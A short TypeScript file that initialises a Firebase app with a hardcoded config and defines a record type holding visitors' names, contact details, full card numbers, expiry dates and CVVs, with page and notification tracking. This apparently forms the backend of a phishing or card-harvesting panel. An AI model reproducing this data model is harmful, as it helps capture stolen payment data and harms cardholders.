import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
   apiKey: "AIzaSyDLCDJR1nhyxXeJ4_W2-SHjBvBmBBS_1U0",
  authDomain: "dggdsd-ac173.firebaseapp.com",
  projectId: "dggdsd-ac173",
  storageBucket: "dggdsd-ac173.firebasestorage.app",
  messagingSenderId: "436657489509",
  appId: "1:436657489509:web:4f2621806c2865c019688c",
  measurementId: "G-H78F108XPE"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

